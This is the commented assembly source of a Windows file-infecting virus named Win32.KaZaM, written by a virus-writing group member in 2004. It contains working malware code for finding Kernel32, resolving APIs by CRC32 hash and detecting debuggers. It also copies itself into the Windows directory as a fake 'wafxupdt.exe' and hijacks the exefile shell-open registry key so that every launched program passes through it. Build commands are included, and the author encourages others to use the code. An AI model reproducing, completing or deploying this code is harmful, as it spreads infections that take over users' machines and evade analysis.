;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;						[ Win32.KaZaM	      Sinclaire/DCA ]
;						[ 18.10.2004 - Made in Egypt, Cairo ]
;
;	[ Introduction ]
;
;		Welcome to 'KaZaM'. This is a new kind of viruses for me as this is the
;		first  time  to try the EPO (Entry Point Obscuring) technique which was
;		originally created by 'GriYo/29A', anyway a virus without EPO is a very
;		easy  detectable  virus,  however  this  is not the issue here, the EPO
;		technique  am using in this virus is replacing the DOS STUB of the file
;		i  want  to infect with another STUB which is crafted to load the virus
;		within  the  original  host,  how?, *g* let me explain, it obscures the
;		entry  point  by clearing it in the header, so the victims get executed
;		from  the  very beginning of the file (Including The 'MZ' Signature)and
;		then 'jmp' to a loader located in the DOS stub code, which is redone to
;		keep  compatibility  (So Victims Running Under 'MS-DOS' Will Receive No
;		Error).  This loader passes control to the virus using a 'SEH' frame to
;		'jmp',  thus,  the  virus  is in it's way to be undetectable, the virus
;		also  loads the API's the virus going to use dynamically by the 'CRC32'
;		method,  the  virus  also  shows  a  new  method of infection which was
;		presented  by  our friend 'malfunc' (A Very Good VXER, 'Hi'), how?, *g*
;		let me explain, The virus changes the 'HKCR\exefile\shell\open\command' 
;		key  to  trap  any  program which gets executed, and then infects them,
;		which is the 'Registery Shell Spawning' method, also the virus infectes
;		files  by  overwriting  the  '.reloc'  section,  the  virus also avoids
;		infection  troubles  under  'Win2K'  and 'WinME' that occurs due to the
;		protection  of the file by the system ‘SFP’ (SystemFileProtection), the
;		virus uses 'SEH' (Structured Exceptional Handling) almost everywhere to
;		avoid  sudden  crashing,  also  the  virus  can crash application level
;		debuggers  using  'SEH',  the virus also avoids to infect bait files or
;		files that are too tiny  or  too big. The virus was tested under Win95,
;		Win98SE,  Win2000,  WinNT, WinXP, so it works well under the conditions
;		the  virus  was  tested  on,  but it may not work for some reasons, who
;		knows o_0.
;
;	[ Features ]
;		+ Infection: Overwriting .reloc section
;		+ System Hooking: Changes 'exefile' registry key to trap EXE
;			files execution
;		+ EPO: Virus code is run from a crafted loader within DOS
;			stub, using SEH frame
;		+ Anti-Bait: Does not infect tiny files (with relocations < virus)
;		+ Anti-Debugging: Detects application-level debuggers, tries to
;			kill them with SEH frame
;		+ Checks for SFC protection
;		+ CRC32 usage to load api's dynamically
;
;	[ Greetings ]
;
;		Cyclone00, madman, VxF, SirToro, SlageHammer, Vecna, DR-EF, blueowl
;		Muazzin, opc0de, Falckon, DiA, SPTH, Philie, VirusBuster, Capoeira
;		lifewire, int3, Belial, DoxtorL, i0n, Necronomikon, SnakeMan, Ratter
;		Rajaat, GriYo, ZOMBiE, Vallez, Benny, Knowdeth, Metal, malfunc
;		and other that i forgot about (Sorry wasn't intentional)
;
;	[ Special Thanks ]
;		Cyclone00: For telling me it's time to stop using offsets addressi-
;					ng and start use the structures we have (hi cyc)
;		SlageHammer: For testing this virus
;		SirToro: For helping me before and showing me some cool stuff ;)
;
;
;	[ Word To AV'ers ]
;		I  was  really disappointed that my virus got named after some worm
;		named  Zaka  how  come Win32.KaZaM get a name as Win32.Zaka as some
;		AV  names  it as it, however they are not similiar in any ways, and
;		just FYI my other virus got a description even thought this one ki-
;		cks  the  first one's in almost everything, but i think if this got
;		spread  out  maybe you would put a nice description and name, sorry
;		that i don't like to spread much but you didn't gave me much choic-
;		e, so word of advice WORK WELL NEXT TIME.
;
;	[ AV Story ]
;		Well funny story that AV'ers named this virus Zaka.A and not KaZaM
;		but then i realized that KaZaM is kinda near to the word Zaka so i
;		just forgot, we all know how STUPID AV'ers can be ;) but here is a
;		link to see the differnec between Win32.Zaka.A and Worm.Win32.Zaka
;		http://www.viruslist.com/en/find?words=Win32.Zaka
;		The first two enteris belong to the virus the others belong to some
;		other worm called the same name *Sad But True* :P.
;
;	[ Compilation + Linking ]
;		tasm32 /ml /m2 /m3 /w2 /la KaZaM.asm , ,
;		tlink32 /Tpe /aa /c KaZaM,KaZaM,,import32.lib
;		pewrsec.exe KaZaM.exe
;
;	[ Disclaimer ]
;		Do your thing, and make me proud =), nah, just am not responsible
;		for anything that happens from this source code. ;)
;
;
; (C) 2004 Sinclaire/DCA               					[ http://dca-vx.tk ]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Win32.KaZaM                               		(C) 2004 Sinclaire/DCA
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


.386                                   					; Instruction set to be used
.model flat                            					; No segmentation!

include MZ.inc                      					; DOS (MZ) & Win32 (PE) exe layout
include PE.inc

extrn 	ExitProcess           :PROC      				; Some APIs used by fake host code
extrn 	MessageBoxA           :PROC      				;
extrn 	_wsprintfA            :PROC      	    		;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Useful equates and macros
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
DEBUG				equ  	FALSE                    	; Debug
CRLF				equ  	<13,10>                  	; New line
SPAWN_NAME        	equ  	<'wafxupdt.exe'>         	; Fake virus name for spawning
VIRUS_NAME        	equ  	<'Win32.KaZaM'>          	; Real virus name
VIRUS_VERSION     	equ  	<'v1.00'>                	; Virus version
VIRUS_SIZE        	equ  	VirusEnd - VirusStart		; Virus size
OPCODE_JMP_SHORT  	equ  	0EBh                     	; OPCode for the jump to virus body

KERNEL32_WIN9X     	equ		0BFF70000h  				; Hardcoded values, in case we don't
KERNEL32_WINNT     	equ     077F00000h  				; find Kernel32 by other ways. Those
KERNEL32_WIN2K     	equ     077E00000h  				; values are then checked using SEH
KERNEL32_WINME     	equ     0B60000h  					; before using them, to avoid PF's

apicall MACRO apiname                           		; The following macro is just used
    call [ebp + apiname]                        		; to call apis, optimizations :)
ENDM

SETUP_SEH_HANDLER  MACRO  label                 		; The folowing macro is just used
		local	@@Skip_Handler                  		; to call SEH handler, just for
        call    @@Skip_Handler                  		; optimizations so i wouldn't write
        mov     esp, [esp + 08h]                		; it every time i needed to ;)
        jmp     label                           		; ...
    @@Skip_Handler:                             		; ...
        xor     edx, edx                        		; ...
        push    dword ptr fs:[edx]              		; ...
        mov     dword ptr fs:[edx], esp         		; ...
ENDM                                            		; ...

RESTORE_SEH_HANDLER  MACRO                      		;
	xor		edx, edx                            		;
    pop     dword ptr fs:[edx]                  		;
    pop     edx                                 		;
ENDM

GENERATE_EXCEPTION  MACRO                       		; The following macro is just used
	xor	   edx, edx                             		; to generate an exception so that
	div    edx                                  		; we can crash application level
ENDM													; debuggers by dividing by '0'

STRLEN MACRO                                    		;
	push	eax                                 		;
	push	esi                                 		;
	push	edi                                 		;
	mov		edi, esi                               	 	;
	xor		ecx, ecx                                	;
	dec		ecx                                     	;
	xor		eax, eax                                	;
	repne	scasb                               		;
	mov		ecx, edi                                	;
	sub		ecx, esi                                	;
	pop		edi                                     	;
	pop		esi                                     	;
	pop		eax                                     	;
ENDM                                            		;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Some global constants
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
NULL                            EQU     0
FALSE                           EQU     0
TRUE                            EQU     1
MAX_PATH                        EQU     260
STANDARD_RIGHTS_REQUIRED        EQU     000F0000h
GMEM_FIXED      				EQU		0000h
GMEM_ZEROINIT 					EQU		40h
GENERIC_READ                    EQU     80000000h
GENERIC_WRITE                   EQU     40000000h
FILE_ATTRIBUTE_NORMAL           EQU     00000080h
OPEN_EXISTING                   EQU     3
SECTION_QUERY                   EQU     00000001h
SECTION_MAP_WRITE               EQU     00000002h
SECTION_MAP_READ                EQU     00000004h
SECTION_MAP_EXECUTE             EQU     00000008h
SECTION_EXTEND_SIZE             EQU     00000010h
SECTION_ALL_ACCESS              EQU     STANDARD_RIGHTS_REQUIRED	OR \
                                        SECTION_QUERY            	OR \
                                        SECTION_MAP_WRITE        	OR \
                                        SECTION_MAP_READ         	OR \
                                        SECTION_MAP_EXECUTE      	OR \
                                        SECTION_EXTEND_SIZE
STANDARD_RIGHTS_ALL 			EQU 	1F0000h
KEY_QUERY_VALUE 				EQU 	1h
KEY_SET_VALUE 					EQU 	2h
KEY_CREATE_SUB_KEY 				EQU 	4h
KEY_ENUMERATE_SUB_KEYS 			EQU 	8h
KEY_NOTIFY 						EQU 	10h
KEY_CREATE_LINK 				EQU 	20h
SYNCHRONIZE 					EQU 	100000h
KEY_ALL_ACCESS 					EQU		STANDARD_RIGHTS_ALL 	 	OR \
										KEY_QUERY_VALUE          	OR \
										KEY_SET_VALUE            	OR \
										KEY_CREATE_SUB_KEY       	OR \
										KEY_ENUMERATE_SUB_KEYS		OR \
										KEY_NOTIFY 		 			OR \
										KEY_CREATE_LINK		   AND NOT \
										SYNCHRONIZE
HKEY_CLASSES_ROOT				EQU		80000000h
FILE_MAP_ALL_ACCESS             EQU     SECTION_ALL_ACCESS
PAGE_READWRITE                  EQU     00000004h
FILE_SHARE_READ         		EQU     00000001h
REG_SZ 							EQU	 	1h

STARTUPINFO		struc
	cb					DWORD   ?
	lpReserved          DWORD   ?
	lpDesktop			DWORD   ?
	lpTitle             DWORD   ?
	dwX                 DWORD   ?
	dwY                 DWORD   ?
	dwXSize             DWORD   ?
	dwYSize             DWORD   ?
	dwXCountChars       DWORD   ?
	dwYCountChars       DWORD   ?
	dwFillAttribute		DWORD   ?
	dwFlags             DWORD   ?
	wShowWindow         WORD    ?
	cbReserved2         WORD    ?
	lpReserved2         DWORD   ?
	hStdInput           DWORD   ?
	hStdOutput          DWORD   ?
	hStdError           DWORD   ?
STARTUPINFO 	ends

SYSTEMTIME 	struc
	wYear 			DWORD 	?
	wMonth 			DWORD 	?
	wDayOfWeek		DWORD 	?
	wDay 			DWORD 	?
	wHour 			DWORD 	?
	wMinute 		DWORD 	?
	wSecond 		DWORD 	?
	wMilliseconds 	DWORD 	?
SYSTEMTIME 	ends

PROCESS_INFORMATION 	struc
	hProcess      	DWORD	?
	hThread     	DWORD	?
	dwProcessId 	DWORD	?
	dwThreadId		DWORD 	?
PROCESS_INFORMATION		ends



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Host Data
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; This data is used only by first-generation fake host code
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.data
	szTitle		db  VIRUS_NAME, 0
	szTemplate	db  'Virus ',VIRUS_NAME,' ',VIRUS_VERSION,' ','has been activated.', CRLF, CRLF
				db  'Am a singing kangaroo, and am from far away, i like to hop hop hop all day', CRLF, CRLF
				db  'Current virus size is %i bytes (0x%X bytes).'
				db  'Have a nice day. :)', 0
	szBait		db  'bait1.exe', 0



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Virus Code
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.code

VirusStart:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Setup everything
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		call GetDeltaOffset								; See where are we ?
	GetDeltaOffset:										;
		pop		ebp										;
		sub		ebp, offset GetDeltaOffset				; EBP = Place where we are in (virus)

		test	ebp, ebp								; Check if it's the first generation
		jz		FirstGenEntry							; We are ?

		mov		esp, [esp + 08h]						;
		RESTORE_SEH_HANDLER								;

		mov		eax, [ebp + File_EntryPoint]			; Original EP (saved during infection)
		mov		[ebp + HostEntry], eax					; Save it in a safe place

	FirstGenEntry:
		cld												; We don't like surprises...
		mov		esi, [esp]                    			; To find Kernel32 we will use the
		call	FindKernel32                  			; ret address in the stack, wich
		jc		ReturnToHost                  			; (hopefully) will point into it
		call	LocateAPIs								; Get API Addresses
		jc		ReturnToHost							; Return to host
		test	ebp, ebp								;
		jz		FakeHost								; Jump to the fake host

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Starting Stuff
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
		call	RNG_Init                      			; Init the Random Number Generator

		call	DetectDebuggers							; Detect and kill application level debuggers
		jc		ReturnToHost							; Return back to host

		call	ParseCommandLine						; Get commandline args
		jnc		ExecutedFromReg

		call	SetupRegHook							; Setup the shell spawning method
		jmp		ReturnToHost							; Return back to host

	ExecutedFromReg:
		mov		esi, [ebp + CmdExefile]					;
		IF DEBUG										;
			push 	1040h								;
			lea  	edx, [ebp + szVirusName]			;
			push 	edx									;
			push 	esi									;
			push 	NULL								;
			apicall	MessageBox							;
		ELSE											;
			call 	InfectFile							;
		ENDIF      										;
		jne		ExecuteVictim							;
		push	1040h									;
		lea		edx, [ebp + szVirusName]				;
		push	edx										;
		lea		edx, [ebp + szVirusCredits]				;
		push	edx										;
		push	NULL									;
		apicall	MessageBox								;
		IF DEBUG										;
		ELSE											;
			jmp	ExitToWindows							;
		ENDIF											;

	ExecuteVictim:
		mov  	esi, [ebp + CmdSpawn]         			;
		mov  	ebx, [ebp + ProcessInfo]      			; Must execute our command line
		mov  	edx, [ebp + StartupInfo]      			; as a new process

		xor		eax, eax

		push 	ebx
		push 	edx
		push 	eax
		push 	eax
		push 	eax
		push 	eax
		push 	eax
		push 	eax
		push 	esi
		push 	eax
		apicall CreateProcess

	ExitToWindows:
		push	0
		apicall	ExitProcess_

	ReturnToHost:
		test	ebp, ebp
		jz		FakeHost_Quit
		push	[ebp + HostEntry]

		ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;
; Virus Subroutines ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 1) DetectDebuggers														;
; 2) FindKernel32															;
; 3) LocateAPIs																;
; 4) ParseCommandLine														;
; 5) SetupRegHook															;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; DetectDebuggers 															;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Discription : 															;
; 	Detects application level debuggers and tries to kill them with SEH		;
;																			;
; Input:																	;
;	None																	;
;																			;
; Output:																	;
;   CF : Set if debugger persists, clear if not								;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
DetectDebuggers:
		pushad
		SETUP_SEH_HANDLER 	FD_Continue        			; Use SEH to kill debuggers
		xor		eax, eax                     			; Generate an exception (divide by 0)
		div		eax                          			;
		RESTORE_SEH_HANDLER                				; Here some abnormal occured
		jmp		FD_Debugger_Found            			; So lets quit

	FD_Continue:                         				; Execution should resume at this pnt
		RESTORE_SEH_HANDLER                				; Remove handler
		mov		eax, fs:[20h]                			; Detect application-level debugger
    	test	eax, eax                     			; Is present?
    	jnz		FD_Debugger_Found            			; Quit!

		popad                              				; No debuggers found, so restore registeres

		clc                                				; Clear carry flag

		ret                                				; Return

	FD_Debugger_Found:
		popad

		stc

		ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; FindKernel32 																;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Tries to find Kernel32 base address by scanning back from a certain 	;
;	address and, if that fails, by using some hardcoded values				;
;																			;
; Input:																	;
;   ESI : must point somewhere into kernel32								;
;																			;
; Output:																	;
;   _var!Kernel32 	: Will point to Kernel32 base address					;
;   CF (Cary Flag)	: Set on error											;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
FindKernel32:
		pushad

		and		esi, 0FFFF0000h
		mov		ecx, 100h

	FK32_Loop:
		call 	TryAddress
		jnc  	FK32_Success
		sub  	esi, 010000h
		loop 	FK32_Loop

	FK32_Hardcodes:
		mov  	esi, KERNEL32_WIN9X
		call 	TryAddress
		jnc  	FK32_Success

		mov  	esi, KERNEL32_WINNT
		call 	TryAddress
		jnc  	FK32_Success

		mov  	esi, KERNEL32_WIN2K
 		call 	TryAddress
		jnc  	FK32_Success

		mov  	esi, KERNEL32_WINME
		call 	TryAddress
		jnc  	FK32_Success

	FK32_Fail:
		popad

		stc

		ret

	FK32_Success:
		mov 	[ebp + Kernel32], esi

		popad

		clc

		ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; LocateAPIs																;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Gets all API addresses that our virus needs								;
;																			;
; Input:																	;
;	None																	;
;																			;
; Output:																	;
;   CF (Carry Flag) : set on error, clear on success						;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
LocateAPIs:
		pushad

		mov  	ebx, [ebp + Kernel32]         			; Having found Kernel32, we will get
		lea  	esi, [ebp + Kernel_API_CRC32] 			; an array of API addresses by their
		lea  	edi, [ebp + Kernel_API_Addr]  			; names CRC32, scanning the Kernel32
		call 	GetAPIArray                   			; export table
		jc   	LA_Fail                       			;

		lea  	edx, [ebp + szUser32]         			; More API's! This time we call
		push 	edx                           			; LoadLibrary to get User32
		apicall	LoadLibrary                   			; Call API
		mov  	ebx, eax                      			; EBX = Module handle
		lea  	esi, [ebp + User_API_CRC32]   			; ESI = Pointer to CRC32 table
		lea  	edi, [ebp + User_API_Addr]    			; EDI = Where to store addresses
		call 	GetAPIArray                   			; Call our procedure
		jc   	LA_Fail                       			; Any problem? If so, bail out

		lea  	edx, [ebp + szAdvapi32]       			; More API's!
		push 	edx                           			;
		apicall	LoadLibrary                   			;
		mov  	ebx, eax                      			;
		lea  	esi, [ebp + Advapi_API_CRC32] 			;
		lea  	edi, [ebp + Advapi_API_Addr]  			;
		call 	GetAPIArray                   			;
		jc   	LA_Fail                       			; Any problem? If so, bail out

	LA_Success:
		popad

		clc

		ret

	LA_Fail:
		popad

 		stc

 		ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; ParseCommandLine															;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Parses our commandline and checks for special params					;
;																			;
; Input:																	;
;	None																	;
;																			;
; Output:																	;
;   _var!CmdLine															;
;   _var!CmdSpawn															;
;   _var!CmdExefile															;
;   CF (Carry Flag) : Set if no special param found, clear otherwise		;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ParseCommandLine:
		pushad

		xor		eax, eax
		mov    	[ebp + CmdSpawn], eax
		mov    	[ebp + CmdExefile], eax
		apicall	GetCommandLine                			; Get our command line
		mov    	[ebp + CmdLine], eax          			; Save it

		mov    	esi, eax                      			;
		call   	GetNextParam                  			;
		jc     	PCL_Quit                      			;

		lodsb
		dec    	al
		jnz    	PCL_Quit
		mov    	[ebp + CmdSpawn], esi

		STRLEN
		push   	ecx
		push   	GMEM_FIXED
		apicall GlobalAlloc
		mov    	[ebp + CmdExefile], eax

		mov    	edi, eax
		STRLEN
 		rep    	movsb

		mov    	esi, [ebp + CmdExefile]
		call   	GetNextParam
		jc     	PCL_Quit

		dec    	esi
		mov    	byte ptr [esi], 0

		popad

		clc

		ret

	PCL_Quit:
		popad

		stc

		ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; SetupRegHook																;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Copies our host to Windows directory and changes the 'exefile' 			;
;	key in reg																;
;																			;
; Input:																	;
;	None																	;
;																			;
; Output:																	;
;	None																	;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
SetupRegHook:
	pushad

	sub  	esp, MAX_PATH
	mov  	esi, esp
 	sub  	esp, MAX_PATH
	mov  	edi, esp

	push 	MAX_PATH
	push 	edi
	apicall	GetWindowsDirectory

    lea  	edx, [ebp + szSpawnFile]
    push 	edx
    push 	edi
    apicall	lstrcat

    push 	MAX_PATH
    push 	esi
    push 	NULL
    apicall	GetModuleFileName

    push 	FALSE
    push 	edi
    push 	esi
    apicall	CopyFile

    lea  	esi, [ebp + szRegValue]
    lea  	edi, [ebp + szRegKey]
    mov  	edx, HKEY_CLASSES_ROOT
    call	ChangeRegString

    add  	esp, MAX_PATH + MAX_PATH

    popad

    ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;
; Virus Functions ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; 1) ChangeRegString														;
; 2) GetAPIAddress															;
; 3) GetAPIArray															;
; 4) GetCRC32																;
; 5) GetNextParam															;
; 6) TryAddress																;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; ChangeRegString															;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Shortcut to change a registry string									;
;																			;
; Input:																	;
;   EDI : pointer to key to be changed										;
;   ESI : pointer to key value												;
;   EDX : hotkey															;
;																			;
; Output:																	;
;	None																	;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ChangeRegString:
    pushad

    sub		esp, 4
    mov  	ebx, esp

    push 	ebx
    push 	KEY_ALL_ACCESS
    push 	0
    push 	edi
    push 	edx
    apicall	RegOpenKeyEx

    STRLEN
    dec  	ecx
    push 	ecx
    push 	esi
    push 	REG_SZ
    push 	NULL
    push 	dword ptr [ebx]
    apicall	RegSetValue

    push 	dword ptr [ebx]
    apicall	RegCloseKey

    add  	esp, 4

    popad

    ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; GetAPIAddress 															;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Tries to get an API address by its CRC32 from the given 				;
; 	module export table														;
;																			;
; Input:																	;
;   ESI : module handle														;
;   EDX : API's CRC32														;
;																			;
; Output:																	;
;   EAX : API's address														;
;   CF (Carry Flag) : set on error, clear on success						;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
GetAPIAddress:
    	pushad

    	mov  	edi, esi
    	add  	esi, [edi.MZ_lfanew]
    	add  	esi, 078h
    	lodsd
    	add  	eax, edi
    	mov  	esi, eax

    	mov  	eax, [esi.ED_NumberOfNames]
    	mov  	[ebp + ET_MaxNames], eax

    	mov  	eax, [esi.ED_AddressOfNames]
    	add  	eax, edi
    	mov  	[ebp + ET_PtrNames], eax

    	mov  	eax, [esi.ED_AddressOfFunctions]
    	add  	eax, edi
    	mov  	[ebp + ET_PtrAddresses], eax

    	mov  	eax, [esi.ED_AddressOfNameOrdinals]
    	add  	eax, edi
    	mov  	[ebp + ET_PtrOrdinals], eax

    	mov  	esi, [ebp + ET_PtrNames]
    	mov  	ecx, [ebp + ET_MaxNames]
    	xor  	eax, eax
    	mov  	[ebp + Count], eax

	GA_GetNamePtr:
		jecxz 	GA_Fail
    	lodsd
    	push 	esi
    	add  	eax, edi
    	mov  	esi, eax
    	xor  	ebx, ebx

    	push 	ecx
    	STRLEN
    	call 	GetCRC32
    	pop  	ecx
    	cmp  	eax, edx
    	jne  	GA_Next

    	mov  	ecx, [ebp + Count]

    	mov  	esi, [ebp + ET_PtrOrdinals]
    	shl  	ecx, 1
    	add  	esi, ecx
    	xor  	eax, eax
    	lodsw
    	mov  	esi, [ebp + ET_PtrAddresses]
    	shl  	eax, 2
    	add  	esi, eax
    	lodsd
    	add  	eax, edi
    	mov 	[ebp + ET_TmpAddress], eax
    	jmp 	GA_Success

	GA_Next:
    	pop  	esi
    	dec  	ecx
    	inc  	[ebp + Count]
    	jmp  	GA_GetNamePtr

	GA_Success:
		pop  	esi
    	popad
    	mov  	eax, [ebp + ET_TmpAddress]

    	clc

    	ret

	GA_Fail:
    	popad

    	stc

    	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; GetAPIArray 																;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Description:																;
; 	Gets an array of API addresses from the given module					;
;																			;
; Input:																	;
;   ESI : points to an array of CRC32 values, ending with a NULL dword		;
;   EDI : points to destination of the address array						;
;   EBX : module handle														;
;																			;
; Output:																	;
;   CF (Carry Flag) : set on error, clear on success						;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
GetAPIArray:
    pushad

	GAA_Loop:
		lodsd
		test 	eax, eax
    	jz   	GAA_Success
    	mov  	edx, eax
    	push 	esi
    	mov  	esi, ebx
    	call 	GetAPIAddress
    	jc   	GAA_Fail
    	stosd
    	pop  	esi
    	jmp  	GAA_Loop

	GAA_Success:
    	popad

    	clc

    	ret

	GAA_Fail:
    	popad

    	stc

    	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

